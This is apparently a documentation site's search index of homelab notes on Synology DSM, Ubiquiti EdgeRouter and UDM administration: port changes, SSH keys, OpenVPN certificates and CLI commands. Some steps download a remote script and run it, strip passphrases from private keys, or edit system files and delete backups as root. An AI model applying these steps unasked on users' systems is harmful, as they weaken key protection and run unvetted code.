don't forget to change to destinations. synoconfbkp export --filepath=/volume1/activeShare/Dropbox/SettingsConfigs/synologyConfigBackup/$(hostname)_$(date +%y%m%d).dss && find /volume1/activeShare/Dropbox/SettingsConfigs/synologyConfigBackup -type f -mtime +60 -exec rm -f {} \\;", "title": "Auto DSM Config Backup"}, {"location": "infrastructure/synology/disable-dms-listening-on-80-443-ports/", "tags": ["template", "markdown"], "text": "Free 80,443 Ports On Synology NAS (DSM) \u00b6 Synology NAS (DSM) is a network storage device, with some additional features like native support for virtualization, and docker support. One of the issues is that the default ports 80 and 443 are used by the web server even if you change the default ports of the Synology's DSM to other ports. In some cases, you want to use these ports for other purposes, such as a reverse proxy as an entry point for the web services. The following steps will help you to free the default ports 80 and 443 on the Synology NAS (DSM) for other purposes. Configure the Synology NAS (DSM) to Listen on Other Ports \u00b6 First, you need to configure the Synology NAS (DSM) to listen on other ports then 80, 443. Login to the Synology NAS (DSM) as administrator user open Control Panel and find Login Portal under System Under DSM tab, change the DSM port (http) to a different port then 80, and the DSM port (https) to a different port then 443. Click Save to save the changes. Then, re-login to the Synology NAS (DSM) with the new port as administrator user as we did above. Disable the Synology NAS (DSM) to Listen on 80, 443 Ports \u00b6 Synology NAS (DSM) will listen on 80, 443 ports after each reboot. Therefore, the changes will be lost after each reboot. The workaround is to run the a script to free the ports 80, 443 on each time the Synology NAS (DSM) is boots. The following one liner will free the ports 80, 443 on Nginx web server of the Synology NAS (DSM), until the Synology NAS (DSM) is rebooted. It removes the port 80, 443 from the Nginx config and restarts the Nginx service. DSM 7.x.x DSM 6.x.x sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache synosystemctl restart nginx sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache synoservicecfg --restart nginx In order to persist the changes, we will create a Scheduled Task to run the above script on each reboot. Head to Control Panel and find Task Scheduler , then click Create and select Triggerd Task - User-defined script . At Create Task - General page, fill in the following information: Task: Disable_DSM_Listening_on_80_443 User: root Event: Boot-up Pre-taks: None Enabled: Yes At Task Settings tab, under Run command fill the User-defined script with the following depending on Synology NAS (DSM) version: DSM 7.x.x DSM 6.x.x sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache synosystemctl restart nginx sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache synoservicecfg --restart nginx Suggestion: Select the Notification when the task is terminated abnormally. Click OK . The new task should be created. You can check the task by clicking Run in the Task Scheduler page. Preferred to reboot the Synology NAS (DSM) to make sure the changes are applied at boot.", "title": "Free 80,443 Ports"}, {"location": "infrastructure/synology/disable-dms-listening-on-80-443-ports/#free-80443-ports-on-synology-nas-dsm", "text": "Synology NAS (DSM) is a network storage device, with some additional features like native support for virtualization, and docker support. One of the issues is that the default ports 80 and 443 are used by the web server even if you change the default ports of the Synology's DSM to other ports. In some cases, you want to use these ports for other purposes, such as a reverse proxy as an entry point for the web services. The following steps will help you to free the default ports 80 and 443 on the Synology NAS (DSM) for other purposes.", "title": "Free 80,443 Ports On Synology NAS (DSM)"}, {"location": "infrastructure/synology/disable-dms-listening-on-80-443-ports/#configure-the-synology-nas-dsm-to-listen-on-other-ports", "text": "First, you need to configure the Synology NAS (DSM) to listen on other ports then 80, 443. Login to the Synology NAS (DSM) as administrator user open Control Panel and find Login Portal under System Under DSM tab, change the DSM port (http) to a different port then 80, and the DSM port (https) to a different port then 443. Click Save to save the changes. Then, re-login to the Synology NAS (DSM) with the new port as administrator user as we did above.", "title": "Configure the Synology NAS (DSM) to Listen on Other Ports"}, {"location": "infrastructure/synology/disable-dms-listening-on-80-443-ports/#disable-the-synology-nas-dsm-to-listen-on-80-443-ports", "text": "Synology NAS (DSM) will listen on 80, 443 ports after each reboot. Therefore, the changes will be lost after each reboot. The workaround is to run the a script to free the ports 80, 443 on each time the Synology NAS (DSM) is boots. The following one liner will free the ports 80, 443 on Nginx web server of the Synology NAS (DSM), until the Synology NAS (DSM) is rebooted. It removes the port 80, 443 from the Nginx config and restarts the Nginx service. DSM 7.x.x DSM 6.x.x sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache synosystemctl restart nginx sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache synoservicecfg --restart nginx In order to persist the changes, we will create a Scheduled Task to run the above script on each reboot. Head to Control Panel and find Task Scheduler , then click Create and select Triggerd Task - User-defined script . At Create Task - General page, fill in the following information: Task: Disable_DSM_Listening_on_80_443 User: root Event: Boot-up Pre-taks: None Enabled: Yes At Task Settings tab, under Run command fill the User-defined script with the following depending on Synology NAS (DSM) version: DSM 7.x.x DSM 6.x.x sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache synosystemctl restart nginx sed -i -e 's/80/81/' -e 's/443/444/' /usr/syno/share/nginx/server.mustache /usr/syno/share/nginx/DSM.mustache /usr/syno/share/nginx/WWWService.mustache synoservicecfg --restart nginx Suggestion: Select the Notification when the task is terminated abnormally. Click OK . The new task should be created. You can check the task by clicking Run in the Task Scheduler page. Preferred to reboot the Synology NAS (DSM) to make sure the changes are applied at boot.", "title": "Disable the Synology NAS (DSM) to Listen on 80, 443 Ports"}, {"location": "infrastructure/synology/ssh-with-rsa-key/", "tags": ["synology", "dsm", "ssh", "rsa-keys"], "text": "Synology DSM - Allow Presistent SSH With RSA Keys \u00b6 As a power user, i would like to be able to connect to my Synology DSM vis SSH. The issue is that Synology DSM won't allow you to use SSH with RSA keys out of the box and only allows you to use SSH with password. In order to allow the use of SSH keys we need to perform the following steps: Requirements \u00b6 I will assume you have already have SSH keys generated, SSH server configured on Synology DSM Generated SSH keys SSH server configured on Synology DSM Allow User Home at DSM Level \u00b6 User Home enable to create a personal home folder for each user, except for guest. This will allow as to create user's .ssh folder and authorized_keys file. Log into Synology web UI as an administrator user Control Panel -> User & Groups -> Advanced, scroll down to \u201cUser Home\u201d Check \u201cEnable user home service\u201d, select an appropriate Location (i.e. volume1) Click \u201cApply\u201d Configure .ssh Folder and authorized_keys File \u00b6 Log in to the NAS through SSH with the user you want to add key authorization for. The following example shows how to add will work for the active user in the SSH session. First change the permissins of the users home folder to 700 sudo chmod 700 ~ Create the .ssh folder and set permissions to 700 mkdir ~/.ssh && chmod 700 ~/.ssh Create the authorized_keys file and set permissions to 644 touch ~/.ssh/authorized_keys && chmod 644 ~/.ssh/authorized_keys Synology's DSM SSH server supports RSA and ed25519 keys. No you need to copy you public keys to authorized_keys file, you can do it manually or use the following command: echo <public-key-sting> >> ~/.ssh/authorized_keys You can do it automatically by using the following command from a client with the ssh key you want to add: ssh-copy-id -i ~/.ssh/id_rsa <user@ip-address> At this point you should be able to connect to Synology DSM via SSH using the key you just added. .md-typeset img { display: inline;", "title": "SSH With RSA Keys"}, {"location": "infrastructure/synology/ssh-with-rsa-key/#synology-dsm-allow-presistent-ssh-with-rsa-keys", "text": "As a power user, i would like to be able to connect to my Synology DSM vis SSH. The issue is that Synology DSM won't allow you to use SSH with RSA keys out of the box and only allows you to use SSH with password. In order to allow the use of SSH keys we need to perform the following steps:", "title": "Synology DSM - Allow Presistent SSH With RSA Keys"}, {"location": "infrastructure/synology/ssh-with-rsa-key/#requirements", "text": "I will assume you have already have SSH keys generated, SSH server configured on Synology DSM Generated SSH keys SSH server configured on Synology DSM", "title": "Requirements"}, {"location": "infrastructure/synology/ssh-with-rsa-key/#allow-user-home-at-dsm-level", "text": "User Home enable to create a personal home folder for each user, except for guest. This will allow as to create user's .ssh folder and authorized_keys file. Log into Synology web UI as an administrator user Control Panel -> User & Groups -> Advanced, scroll down to \u201cUser Home\u201d Check \u201cEnable user home service\u201d, select an appropriate Location (i.e. volume1) Click \u201cApply\u201d", "title": "Allow User Home at DSM Level"}, {"location": "infrastructure/synology/ssh-with-rsa-key/#configure-ssh-folder-and-authorized_keys-file", "text": "Log in to the NAS through SSH with the user you want to add key authorization for. The following example shows how to add will work for the active user in the SSH session. First change the permissins of the users home folder to 700 sudo chmod 700 ~ Create the .ssh folder and set permissions to 700 mkdir ~/.ssh && chmod 700 ~/.ssh Create the authorized_keys file and set permissions to 644 touch ~/.ssh/authorized_keys && chmod 644 ~/.ssh/authorized_keys Synology's DSM SSH server supports RSA and ed25519 keys. No you need to copy you public keys to authorized_keys file, you can do it manually or use the following command: echo <public-key-sting> >> ~/.ssh/authorized_keys You can do it automatically by using the following command from a client with the ssh key you want to add: ssh-copy-id -i ~/.ssh/id_rsa <user@ip-address> At this point you should be able to connect to Synology DSM via SSH using the key you just added. .md-typeset img { display: inline;", "title": "Configure .ssh Folder and authorized_keys File"}, {"location": "infrastructure/ubiquiti/edge-router/", "text": "EdgeRouter \u00b6 Clear DNS Forwarding Cache via SSH Call \u00b6 ssh user@192.168.1.1 'sudo /opt/vyatta/bin/sudo-users/vyatta-op-dns-forwarding.pl --clear-cache' SSH via RSA keys \u00b6 SSH to the Edge Router: Copy the public key to /tmp folder Run: configure loadkey [ your user ] /tmp/id_rsa.pub Check that the keys are working by opening new session Disable Password Authentication set service ssh disable-password-authentication commit ; save Done. Enable Password Authentication if needed. delete service ssh disable-password-authentication Hardening EdgeRouter \u00b6 This will change the GUI to port 8443, disable old cyphers, Only will listen on internal Network. assuming your EdgeRouter IP is 192.168.1.1, if not change it accordingly. SSH to the Edge Router configure set service gui listen-address 192 .168.100.1 set service gui https-port 8443 set service gui older-ciphers disable set service ssh listen-address 192 .168.100.1 set service ssh protocol-version v2 set service ubnt-discover disable commit ; save Hardware Offloading \u00b6 For Devices: ER-X / ER-X-SFP / EP-R6 Enable hwnat and ipsec offloading. configure set system offload hwnat enable set system offload ipsec enable commit ; save Disable hwnat and ipsec offloading. configure set system offload hwnat disable set system offload ipsec disable commit ; save For Devices: ER-4 / ER-6P / ERLite-3 / ERPoE-5 / ER-8 / ERPro-8 / EP-R8 / ER-8-XG Enable IPv4/IPv6 and ipsec offloading. configure set system offload ipv4 forwarding enable set system offload ipv4 gre enable set system offload ipv4 pppoe enable set system offload ipv4 vlan enable set system offload ipv6 forwarding enable set system offload ipv6 pppoe enable set system offload ipv6 vlan enable set system offload ipsec enable commit ; save Disable IPv4/IPv6 and ipsec offloading. configure set system offload ipv4 forwarding disable set system offload ipv4 gre disable set system offload ipv4 pppoe disable set system offload ipv4 vlan disable set system offload ipv6 forwarding disable set system offload ipv6 pppoe disable set system offload ipv6 vlan disable set system offload ipsec disable commit ; save Disable, Update /etc/hosts file on EdgeRouter \u00b6 Disable Auto DHCP hots: configure set service dhcp-server hostfile-update disablecommit commit ; save Update the Host File Manually: configure set system static-host-mapping host-name mydomain.com inet 192 .168.1.10 commit ; save Show DNS Forwarding configure show service dns forwarding Show Hosts Config cat /etc/hosts Guest Wifi With Ubiquiti EdgeRouter and Unifi Access Points \u00b6 EdgeRouter Configuration \u00b6 From the Dashboard, click Add Interface and select VLAN. Set up the VLAN ID as You like for this example will use id 1003 and attach it to the physical interface of your LAN. Give it an IP address in the range of a private IP block, but make sure you end it in a /24 to specify the proper subnet (I originally did /32 as I though it was supposed to be the exact IP address). Click on the Services tab. Click Add DHCP Server. Set it up similar to the image below. Click on the DNS tab under services. Click Add Listen interface and select the VLAN interface. Make sure you hit save. At this point, you should be able to connect to your Guest Network and connect to the Internet. However, you\u2019ll be able to access the EdgeRouter as well as other devices on your LAN. Next thing you have to do is secure the VLAN. Click on Firewall/NAT and then click on Add Ruleset. This is for packets coming into the router destined for somewhere else (not the router). Set up the default policy for Accept. Click Save. From the Actions menu next to the Ruleset, click Interfaces. Select your VLAN interface and the in direction. Click Rules and then Add New Rule. Click on Basic and name it LAN. Select Drop as the Action. Click Destination and enter 10.0.1.0/24 or whatever your LAN IP range is. Then click Save. This will drop all packets from the VLAN destined for your LAN. Save. Repeat 1 and 2 above (name it GUEST_LOCAL). From the Interface, select the VLAN interface and the local direction. However, set up the default policy as Drop. Add a new rule. Set it to Accept on UDP port 53. Save. Let's continue to set up the Uifi AP Unifi Configuration \u00b6 If you want to limit your Guest Users Bandwidth, head over to User Groups and create a new user group called Guest. Enter bandwidth limits that are appropriate for your Internet Speed. I used 6000 down and 2500 up. Now go to the Wireless Networks section and create a new network called \u201cGuest\u201d or whatever you want to call it. Make sure it is enabled, give it WiFi security key, check the \u201cGuest Policy\u201d option, enter the VLAN Id you used previously and choose the Guest User Group. Save! Done. Test Your New Guest Wifi by connecting to the Guest Wifi and browse to a website. EdgeRouter OpenVPN Configuration 443/TCP \u00b6 This Guide is based on Original guide form ubnt support with modifications to the VPN port and protocol For the purpose of this article, it is assumed that the routing and interface configurations are already in place and that reachability has been tested. ssh to the EdgeRouter Make sure that the date/time is set correctly on the EdgeRouter. show date Thu Dec 28 14 :35:42 UTC 2017 Log in as the root user. sudo su Generate a Diffie-Hellman (DH) key file and place it in the /config/auth directory. This Will take some time... openssl dhparam -out /config/auth/dh.pem -2 4096 Change the current directory. cd /usr/lib/ssl/misc Generate a root certificate (replace with your desired passphrase). ./CA.pl -newca exmaple: PEM Passphrase: Country Name: US State Or Province Name: New York Locality Name: New York Organization Name: Ubiquiti Organizational Unit Name: Support Common Name: root Email Address: support@ubnt.com NOTE: The Common Name needs to be unique for all certificates. Copy the newly created certificate + key to the /config/auth directory. cp demoCA/cacert.pem /config/auth cp demoCA/private/cakey.pem /config/auth Generate the server certificate. ./CA.pl -newreq exmaple: Country Name: US State Or Province Name: New York Locality Name: New York Organization Name: Ubiquiti Organizational Unit Name: Support Common Name: server Email Address: support@ubnt.com Sign the server certificate. if you want to change the certificate expiration day use: export default_days=\"3650\" with the value of days you desire ./CA.pl -sign Move and rename the server certificate + key to the /config/auth directory. mv newcert.pem /config/auth/server.pem mv newkey.pem /config/auth/server.key Generate, sign and move the client1 certificates. ./CA.pl -newreq Common Name: client1 ./CA.pl -sign mv newcert.pem /config/auth/client1.pem mv newkey.pem /config/auth/client1.key (Optional) Repeat the process for client2. ./CA.pl -newreq Common Name: client2 ./CA.pl -sign mv newcert.pem /config/auth/client2.pem mv newkey.pem /config/auth/client2.key Verify the contents of the /config/auth directory. ls -l /config/auth You should have those files: cacert.pem cakey.pem client1.key client1.pem client2.key client2.pem dh.pem server.key server.pem Remove the password from the client + server keys. This allows the clients to connect using only the provided certificate. openssl rsa -in /config/auth/server.key -out /config/auth/server-no-pass.key openssl rsa -in /config/auth/client1.key -out /config/auth/client1-no-pass.key openssl rsa -in /config/auth/client2.key -out /config/auth/client2-no-pass.key Overwrite the existing keys with the no-pass versions. mv /config/auth/server-no-pass.key /config/auth/server.key mv /config/auth/client1-no-pass.key /config/auth/client1.key mv /config/auth/client2-no-pass.key /config/auth/client2.key Return to operational mode. exit Enter configuration mode. configure If EdgeRouter's Interface is on port 433, you must change it. set service gui https-port 8443 commit ; save Add a firewall rule for the OpenVPN traffic to the local firewall policy. set firewall name WAN_LOCAL rule 30 action accept set firewall name WAN_LOCAL rule 30 description OpenVPN set firewall name WAN_LOCAL rule 30 destination port 443 set firewall name WAN_LOCAL rule 30 protocol tcp Configure the OpenVPN virtual tunnel interface. push-route - the router for vpn connection name-server - default gateway of the route above set interfaces openvpn vtun0 mode server set interfaces openvpn vtun0 server subnet 172 .16.1.0/24 set interfaces openvpn vtun0 server push-route 192 .168.100.0/24 set interfaces openvpn vtun0 server name-server 192 .168.100.1 set interfaces openvpn vtun0 openvpn-option --duplicate-cn set interfaces openvpn vtun0 local-port 443 edit interfaces openvpn vtun0 set openvpn-option \"--push redirect-gateway\" set protocol tcp-passive commit ; save Link the server certificate/keys and DH key to the virtual tunnel interface. set interfaces openvpn vtun0 tls ca-cert-file /config/auth/cacert.pem set interfaces openvpn vtun0 tls cert-file /config/auth/server.pem set interfaces openvpn vtun0 tls key-file /config/auth/server.key set interfaces openvpn vtun0 tls dh-file /config/auth/dh.pem commit ; save Add DNS forwarding to the new vlan vtun0 to get DNS resolving. Exmaple for clinet.opvn Config \u00b6 client dev tun proto udp remote <server-ip or hostname> 443 float resolv-retry infinite nobind persist-key persist-tun verb 3 ca cacert.pem cert client1.pem key client1.key EdgeRouter Free Up space by Cleaning Old Firmware \u00b6 ssh to the EdgeRouter: delete system image SpeedTest Cli on Edge Router \u00b6 ssh to the Edge Router. installation: curl -Lo speedtest-cli https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py chmod +x speedtest-cli run from the same directory: ./speedtest-cli --no-pre-allocate based on https://github.com/sivel/speedtest-cli Enable NetFlow on EdgeRouter to UNMS \u00b6 The most suitable place to enable NetFlow is your Default gateway router. UNMS supports NetFlow version 5 and 9. UNMS only record flow data for IP ranges defined below. Whenever UNMS receives any data from a router, the status of NetFlow changes to Active . To show interfaces and pick the right interface:\\ show interfaces Example configuration for EdgeRouter: configure set system flow-accounting interface pppoe0 set system flow-accounting ingress-capture post-dnat set system flow-accounting disable-memory-table set system flow-accounting netflow server 192 .168.1.10 port 2055 set system flow-accounting netflow version 9 set system flow-accounting netflow engine-id 0 set system flow-accounting netflow enable-egress engine-id 1 set system flow-accounting netflow timeout expiry-interval 60 set system flow-accounting netflow timeout flow-generic 60 set system flow-accounting netflow timeout icmp 60 set system flow-accounting netflow timeout max-active-life 60 set system flow-accounting netflow timeout tcp-fin 10 set system flow-accounting netflow timeout tcp-generic 60 set system flow-accounting netflow timeout tcp-rst 10 set system flow-accounting netflow timeout udp 60 commit save 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 100.64.0.0/10", "title": "EdgeRouter"}, {"location": "infrastructure/ubiquiti/edge-router/#edgerouter", "text": "", "title": "EdgeRouter"}, {"location": "infrastructure/ubiquiti/edge-router/#clear-dns-forwarding-cache-via-ssh-call", "text": "ssh user@192.168.1.1 'sudo /opt/vyatta/bin/sudo-users/vyatta-op-dns-forwarding.pl --clear-cache'", "title": "Clear DNS Forwarding Cache via SSH Call"}, {"location": "infrastructure/ubiquiti/edge-router/#ssh-via-rsa-keys", "text": "SSH to the Edge Router: Copy the public key to /tmp folder Run: configure loadkey [ your user ] /tmp/id_rsa.pub Check that the keys are working by opening new session Disable Password Authentication set service ssh disable-password-authentication commit ; save Done. Enable Password Authentication if needed. delete service ssh disable-password-authentication", "title": "SSH via RSA keys"}, {"location": "infrastructure/ubiquiti/edge-router/#hardening-edgerouter", "text": "This will change the GUI to port 8443, disable old cyphers, Only will listen on internal Network. assuming your EdgeRouter IP is 192.168.1.1, if not change it accordingly. SSH to the Edge Router configure set service gui listen-address 192 .168.100.1 set service gui https-port 8443 set service gui older-ciphers disable set service ssh listen-address 192 .168.100.1 set service ssh protocol-version v2 set service ubnt-discover disable commit ; save", "title": "Hardening EdgeRouter"}, {"location": "infrastructure/ubiquiti/edge-router/#hardware-offloading", "text": "For Devices: ER-X / ER-X-SFP / EP-R6 Enable hwnat and ipsec offloading. configure set system offload hwnat enable set system offload ipsec enable commit ; save Disable hwnat and ipsec offloading. configure set system offload hwnat disable set system offload ipsec disable commit ; save For Devices: ER-4 / ER-6P / ERLite-3 / ERPoE-5 / ER-8 / ERPro-8 / EP-R8 / ER-8-XG Enable IPv4/IPv6 and ipsec offloading. configure set system offload ipv4 forwarding enable set system offload ipv4 gre enable set system offload ipv4 pppoe enable set system offload ipv4 vlan enable set system offload ipv6 forwarding enable set system offload ipv6 pppoe enable set system offload ipv6 vlan enable set system offload ipsec enable commit ; save Disable IPv4/IPv6 and ipsec offloading. configure set system offload ipv4 forwarding disable set system offload ipv4 gre disable set system offload ipv4 pppoe disable set system offload ipv4 vlan disable set system offload ipv6 forwarding disable set system offload ipv6 pppoe disable set system offload ipv6 vlan disable set system offload ipsec disable commit ; save", "title": "Hardware Offloading"}, {"location": "infrastructure/ubiquiti/edge-router/#disable-update-etchosts-file-on-edgerouter", "text": "Disable Auto DHCP hots: configure set service dhcp-server hostfile-update disablecommit commit ; save Update the Host File Manually: configure set system static-host-mapping host-name mydomain.com inet 192 .168.1.10 commit ; save Show DNS Forwarding configure show service dns forwarding Show Hosts Config cat /etc/hosts", "title": "Disable, Update /etc/hosts file on EdgeRouter"}, {"location": "infrastructure/ubiquiti/edge-router/#guest-wifi-with-ubiquiti-edgerouter-and-unifi-access-points", "text": "", "title": "Guest Wifi With Ubiquiti EdgeRouter and Unifi Access Points"}, {"location": "infrastructure/ubiquiti/edge-router/#edgerouter-configuration", "text": "From the Dashboard, click Add Interface and select VLAN. Set up the VLAN ID as You like for this example will use id 1003 and attach it to the physical interface of your LAN. Give it an IP address in the range of a private IP block, but make sure you end it in a /24 to specify the proper subnet (I originally did /32 as I though it was supposed to be the exact IP address). Click on the Services tab. Click Add DHCP Server. Set it up similar to the image below. Click on the DNS tab under services. Click Add Listen interface and select the VLAN interface. Make sure you hit save. At this point, you should be able to connect to your Guest Network and connect to the Internet. However, you\u2019ll be able to access the EdgeRouter as well as other devices on your LAN. Next thing you have to do is secure the VLAN. Click on Firewall/NAT and then click on Add Ruleset. This is for packets coming into the router destined for somewhere else (not the router). Set up the default policy for Accept. Click Save. From the Actions menu next to the Ruleset, click Interfaces. Select your VLAN interface and the in direction. Click Rules and then Add New Rule. Click on Basic and name it LAN. Select Drop as the Action. Click Destination and enter 10.0.1.0/24 or whatever your LAN IP range is. Then click Save. This will drop all packets from the VLAN destined for your LAN. Save. Repeat 1 and 2 above (name it GUEST_LOCAL). From the Interface, select the VLAN interface and the local direction. However, set up the default policy as Drop. Add a new rule. Set it to Accept on UDP port 53. Save. Let's continue to set up the Uifi AP", "title": "EdgeRouter Configuration"}, {"location": "infrastructure/ubiquiti/edge-router/#unifi-configuration", "text": "If you want to limit your Guest Users Bandwidth, head over to User Groups and create a new user group called Guest. Enter bandwidth limits that are appropriate for your Internet Speed. I used 6000 down and 2500 up. Now go to the Wireless Networks section and create a new network called \u201cGuest\u201d or whatever you want to call it. Make sure it is enabled, give it WiFi security key, check the \u201cGuest Policy\u201d option, enter the VLAN Id you used previously and choose the Guest User Group. Save! Done. Test Your New Guest Wifi by connecting to the Guest Wifi and browse to a website.", "title": "Unifi Configuration"}, {"location": "infrastructure/ubiquiti/edge-router/#edgerouter-openvpn-configuration-443tcp", "text": "This Guide is based on Original guide form ubnt support with modifications to the VPN port and protocol For the purpose of this article, it is assumed that the routing and interface configurations are already in place and that reachability has been tested. ssh to the EdgeRouter Make sure that the date/time is set correctly on the EdgeRouter. show date Thu Dec 28 14 :35:42 UTC 2017 Log in as the root user. sudo su Generate a Diffie-Hellman (DH) key file and place it in the /config/auth directory. This Will take some time... openssl dhparam -out /config/auth/dh.pem -2 4096 Change the current directory. cd /usr/lib/ssl/misc Generate a root certificate (replace with your desired passphrase). ./CA.pl -newca exmaple: PEM Passphrase: Country Name: US State Or Province Name: New York Locality Name: New York Organization Name: Ubiquiti Organizational Unit Name: Support Common Name: root Email Address: support@ubnt.com NOTE: The Common Name needs to be unique for all certificates. Copy the newly created certificate + key to the /config/auth directory. cp demoCA/cacert.pem /config/auth cp demoCA/private/cakey.pem /config/auth Generate the server certificate. ./CA.pl -newreq exmaple: Country Name: US State Or Province Name: New York Locality Name: New York Organization Name: Ubiquiti Organizational Unit Name: Support Common Name: server Email Address: support@ubnt.com Sign the server certificate. if you want to change the certificate expiration day use: export default_days=\"3650\" with the value of days you desire ./CA.pl -sign Move and rename the server certificate + key to the /config/auth directory. mv newcert.pem /config/auth/server.pem mv newkey.pem /config/auth/server.key Generate, sign and move the client1 certificates. ./CA.pl -newreq Common Name: client1 ./CA.pl -sign mv newcert.pem /config/auth/client1.pem mv newkey.pem /config/auth/client1.key (Optional) Repeat the process for client2. ./CA.pl -newreq Common Name: client2 ./CA.pl -sign mv newcert.pem /config/auth/client2.pem mv newkey.pem /config/auth/client2.key Verify the contents of the /config/auth directory. ls -l /config/auth You should have those files: cacert.pem cakey.pem client1.key client1.pem client2.key client2.pem dh.pem server.key server.pem Remove the password from the client + server keys. This allows the clients to connect using only the provided certificate. openssl rsa -in /config/auth/server.key -out /config/auth/server-no-pass.key openssl rsa -in /config/auth/client1.key -out /config/auth/client1-no-pass.key openssl rsa -in /config/auth/client2.key -out /config/auth/client2-no-pass.key Overwrite the existing keys with the no-pass versions. mv /config/auth/server-no-pass.key /config/auth/server.key mv /config/auth/client1-no-pass.key /config/auth/client1.key mv /config/auth/client2-no-pass.key /config/auth/client2.key Return to operational mode. exit Enter configuration mode. configure If EdgeRouter's Interface is on port 433, you must change it. set service gui https-port 8443 commit ; save Add a firewall rule for the OpenVPN traffic to the local firewall policy. set firewall name WAN_LOCAL rule 30 action accept set firewall name WAN_LOCAL rule 30 description OpenVPN set firewall name WAN_LOCAL rule 30 destination port 443 set firewall name WAN_LOCAL rule 30 protocol tcp Configure the OpenVPN virtual tunnel interface. push-route - the router for vpn connection name-server - default gateway of the route above set interfaces openvpn vtun0 mode server set interfaces openvpn vtun0 server subnet 172 .16.1.0/24 set interfaces openvpn vtun0 server push-route 192 .168.100.0/24 set interfaces openvpn vtun0 server name-server 192 .168.100.1 set interfaces openvpn vtun0 openvpn-option --duplicate-cn set interfaces openvpn vtun0 local-port 443 edit interfaces openvpn vtun0 set openvpn-option \"--push redirect-gateway\" set protocol tcp-passive commit ; save Link the server certificate/keys and DH key to the virtual tunnel interface. set interfaces openvpn vtun0 tls ca-cert-file /config/auth/cacert.pem set interfaces openvpn vtun0 tls cert-file /config/auth/server.pem set interfaces openvpn vtun0 tls key-file /config/auth/server.key set interfaces openvpn vtun0 tls dh-file /config/auth/dh.pem commit ; save Add DNS forwarding to the new vlan vtun0 to get DNS resolving.", "title": "EdgeRouter OpenVPN Configuration 443/TCP"}, {"location": "infrastructure/ubiquiti/edge-router/#exmaple-for-clinetopvn-config", "text": "client dev tun proto udp remote <server-ip or hostname> 443 float resolv-retry infinite nobind persist-key persist-tun verb 3 ca cacert.pem cert client1.pem key client1.key", "title": "Exmaple for clinet.opvn Config"}, {"location": "infrastructure/ubiquiti/edge-router/#edgerouter-free-up-space-by-cleaning-old-firmware", "text": "ssh to the EdgeRouter: delete system image", "title": "EdgeRouter Free Up space by Cleaning Old Firmware"}, {"location": "infrastructure/ubiquiti/edge-router/#speedtest-cli-on-edge-router", "text": "ssh to the Edge Router. installation: curl -Lo speedtest-cli https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py chmod +x speedtest-cli run from the same directory: ./speedtest-cli --no-pre-allocate based on https://github.com/sivel/speedtest-cli", "title": "SpeedTest Cli on Edge Router"}, {"location": "infrastructure/ubiquiti/edge-router/#enable-netflow-on-edgerouter-to-unms", "text": "The most suitable place to enable NetFlow is your Default gateway router. UNMS supports NetFlow version 5 and 9. UNMS only record flow data for IP ranges defined below. Whenever UNMS receives any data from a router, the status of NetFlow changes to Active . To show interfaces and pick the right interface:\\ show interfaces Example configuration for EdgeRouter: configure set system flow-accounting interface pppoe0 set system flow-accounting ingress-capture post-dnat set system flow-accounting disable-memory-table set system flow-accounting netflow server 192 .168.1.10 port 2055 set system flow-accounting netflow version 9 set system flow-accounting netflow engine-id 0 set system flow-accounting netflow enable-egress engine-id 1 set system flow-accounting netflow timeout expiry-interval 60 set system flow-accounting netflow timeout flow-generic 60 set system flow-accounting netflow timeout icmp 60 set system flow-accounting netflow timeout max-active-life 60 set system flow-accounting netflow timeout tcp-fin 10 set system flow-accounting netflow timeout tcp-generic 60 set system flow-accounting netflow timeout tcp-rst 10 set system flow-accounting netflow timeout udp 60 commit save 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 100.64.0.0/10", "title": "Enable NetFlow on EdgeRouter to UNMS"}, {"location": "infrastructure/ubiquiti/udm-dream-machine/cli-commands/", "tags": ["udm", "ubiquiti", "unifi"], "text": "UDM CLI Commands List \u00b6 Collection of CLI commands for the Ubiquiti Unifi Dream Machine or Dream Machine Pro. Common UDM Commands \u00b6 Open shell to unifi podman container (udm pro) unifi-os shell Show Sensors information including: UDM temperature, fan speed, and voltage. sensors Show ARP Table arp -a Display All Listening Ports on the UDM Device netstat -plant UDM Commands List \u00b6 Collection of commands for your Unifi Dream Machine or Dream Machine Pro. Description UDM/UDM-P SSH Command show DHCP leases (to NSname) cat /mnt/data/udapi-config/dnsmasq.lease show version info show system hardware and installed software ubnt-device-info summary show cpu tempeture ubnt-systool cputemp show fan speed ubnt-fan-speed show uptime uptime show ip route netstat -rt -n show ppp summery pppstats show current user whoami show log cat /var/log/messages show interface summary ifstat show interfaces ifconfig show other Ubiquiti devices on local LAN segment (ubnt-discovery) ubnt-tools ubnt-discover show config (wireless) cat /mnt/data/udapi-config/unifi packet capture tcpdump shutdown poweroff reload reboot show ipsec sa ipsec statusall factory reset factory-reset.sh show system burnt in MAC address ubnt-tools hwaddr show unifi server logs cat /mnt/data/unifi-os/unifi/logs/server.log show unifi server setttings cat /mnt/data/unifi-os/unifi-core/config/settings.yaml show unifi server http logs cat /mnt/data/unifi-os/unifi-core/logs/http.log show unifi server http logs (errors) cat /mnt/data/unifi-os/unifi-core/logs/errors.log show unifi server discovery log cat /mnt/data/unifi-os/unifi-core/logs/discovery.log show unifi system logs cat /mnt/data/unifi-os/unifi-core/logs/system.log Restarts the UnifiOS Web interface /etc/init.d/S95unifios restart show ip arp (show arp) 